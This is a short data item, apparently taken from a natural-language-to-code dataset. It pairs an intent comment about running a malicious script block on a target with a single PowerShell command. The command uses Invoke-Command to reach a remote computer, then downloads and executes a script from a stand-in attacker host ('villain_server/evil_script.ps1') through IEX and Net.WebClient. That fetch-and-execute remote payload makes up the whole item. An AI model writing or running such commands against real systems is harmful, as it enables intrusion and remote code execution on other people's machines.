# Natural language intent:
# Invoke a potentially malicious script block on a specified target.

Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')}
